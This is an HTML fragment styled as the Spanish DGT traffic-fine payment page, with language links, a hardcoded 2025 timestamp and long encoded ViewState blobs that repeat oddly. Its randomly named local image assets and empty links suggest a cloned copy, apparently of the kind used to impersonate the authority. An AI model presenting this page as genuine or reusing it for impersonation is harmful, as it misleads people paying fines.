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">
      </form>
      <!--  
         <a href="#" class="shopping-badge">
            <span class="fa fa-shopping-cart" aria-hidden="true" title="Carrito de la compra"></span>
            <span class="sr-only">Carrito de la compra</span>
            <span>88</span>
            <span class="sr-only">producto(s) en el carro</span>
         </a>
         -->
   </div>
   <!-- Atajos -->
   <div class="nav-shortcuts focusable small">
      <ul class="inline shortcuts">
         <li><a href="main-content">Salto a contenido</a></li>
         <li><a href="main-navigation">Salto a navegación</a></li>
      </ul>
      <p class="current-time showif-tablet">
         <!-- 
            <span>Miércoles 6 de Abril de 2016 12:34</span>
            <span>Hora Oficial</span>
            -->
         <span>
         viernes 18 de enero de 2025 07:37 Hora Oficial
         </span>
      </p>
   </div>
   <header class="main-header">
      <h1 class="sr-only">
         <span>Sede Electrónica DGT</span>
      </h1>
      <nav>
         <h2 class="sr-only">Cabecera</h2>
         <!-- Cabecera con los logos -->
         <div class="brand">
            <h3 class="sr-only">Organismos</h3>
            <div class="logos">
               <a title="Acceso al Ministerio del Interior en una nueva ventana" href="" target="_blank">
               <img src="./assets/images/kISUiHYQslEg.png" alt="Logotipo del Gobierno de España">
               </a>
               <a title="Acceso a la sede de la Dirección General de Tráfico en nueva ventana" href="http://www.dgt.es/" target="_blank">
               <img src="./assets/images/aoBXVMaFYc0t.png" alt="Logo sede electrónica DGT">
               </a>
            </div>
            <a class="title" href="">
               <span class="main">Pago de sanciones</span>
               <!--
                  <span class="tagline">sede.dgt.gob.es</span>
                  -->
            </a>
            <div class="desktop-fix">
            </div>
         </div>
         <!--/ Cabecera con los logos -->
         <!-- Menu de lenguaje -->
         <form id="formSessionidIoma" name="formSessionidIoma" method="post" action="" enctype="application/x-www-form-urlencoded">
            <input type="hidden" name="formSessionidIoma" value="formSessionidIoma">
            <div class="nav-language small">
               <h3 class="sr-only">Idioma</h3>
               <span class="fa fa-globe fa-big primary-text hideif-tablet" aria-hidden="true"></span>
               <ul class="inline">
                  <li>
                     <script type="text/javascript" language="Javascript">function dpf(f) {var adp = f.adp;if (adp != null) {for (var i = 0;i < adp.length;i++) {f.removeChild(adp[i]);}}};function apf(f, pvp) {var adp = new Array();f.adp = adp;var i = 0;for (k in pvp) {var p = document.createElement("input");p.type = "hidden";p.name = k;p.value = pvp[k];f.appendChild(p);adp[i++] = p;}};function jsfcljs(f, pvp, t) {apf(f, pvp);var ft = f.target;if (t) {f.target = t;}f.submit();f.target = ft;dpf(f);};</script>
                     <a id="formSessionidIoma:linkIdiomaEsId" href="" onclick="var a=function(){cargando();};var b=function(){if(typeof jsfcljs == 'function'){jsfcljs(document.forms['formSessionidIoma'],{'formSessionidIoma:linkIdiomaEsId':'formSessionidIoma:linkIdiomaEsId','iwpsSetLanguageCode':'es'},'');}return false};return (a()==false) ? false : b();">Bienvenidos</a>
                  </li>
                  <li><a id="formSessionidIoma:linkIdiomaEnId" href="" onclick="var a=function(){cargando();};var b=function(){if(typeof jsfcljs == 'function'){jsfcljs(document.forms['formSessionidIoma'],{'formSessionidIoma:linkIdiomaEnId':'formSessionidIoma:linkIdiomaEnId','iwpsSetLanguageCode':'en'},'');}return false};return (a()==false) ? false : b();">Welcome</a>
                  </li>
                  <li><a id="formSessionidIoma:linkIdiomaFrId" href="" onclick="var a=function(){cargando();};var b=function(){if(typeof jsfcljs == 'function'){jsfcljs(document.forms['formSessionidIoma'],{'formSessionidIoma:linkIdiomaFrId':'formSessionidIoma:linkIdiomaFrId','iwpsSetLanguageCode':'fr'},'');}return false};return (a()==false) ? false : b();">Bienvenue</a>
                  </li>
                  <li><a id="formSessionidIoma:linkIdiomaDeId" href="" onclick="var a=function(){cargando();};var b=function(){if(typeof jsfcljs == 'function'){jsfcljs(document.forms['formSessionidIoma'],{'formSessionidIoma:linkIdiomaDeId':'formSessionidIoma:linkIdiomaDeId','iwpsSetLanguageCode':'de'},'');}return false};return (a()==false) ? false : b();">Wilkomemn</a>
                  </li>
                  <li><a id="formSessionidIoma:linkIdiomaCtId" href="" onclick="var a=function(){cargando();};var b=function(){if(typeof jsfcljs == 'function'){jsfcljs(document.forms['formSessionidIoma'],{'formSessionidIoma:linkIdiomaCtId':'formSessionidIoma:linkIdiomaCtId','iwpsSetLanguageCode':'ct'},'');}return false};return (a()==false) ? false : b();">Benvingut</a>
                  </li>
                  <li><a id="formSessionidIoma:linkIdiomaEuId" href="" onclick="var a=function(){cargando();};var b=function(){if(typeof jsfcljs == 'function'){jsfcljs(document.forms['formSessionidIoma'],{'formSessionidIoma:linkIdiomaEuId':'formSessionidIoma:linkIdiomaEuId','iwpsSetLanguageCode':'eu'},'');}return false};return (a()==false) ? false : b();">Ongi-etorri</a>
                  </li>
                  <li><a id="formSessionidIoma:linkIdiomaGaId" href="" onclick="var a=function(){cargando();};var b=function(){if(typeof jsfcljs == 'function'){jsfcljs(document.forms['formSessionidIoma'],{'formSessionidIoma:linkIdiomaGaId':'formSessionidIoma:linkIdiomaGaId','iwpsSetLanguageCode':'ga'},'');}return false};return (a()==false) ? false : b();">Benvido</a>
                  </li>
                  <li><a id="formSessionidIoma:linkIdiomaVaId" href="" onclick="var a=function(){cargando();};var b=function(){if(typeof jsfcljs == 'function'){jsfcljs(document.forms['formSessionidIoma'],{'formSessionidIoma:linkIdiomaVaId':'formSessionidIoma:linkIdiomaVaId','iwpsSetLanguageCode':'va'},'');}return false};return (a()==false) ? false : b();">Benvingut</a>
                  </li>
               </ul>
            </div>
            <input type="hidden" name="javax.faces.ViewState" value="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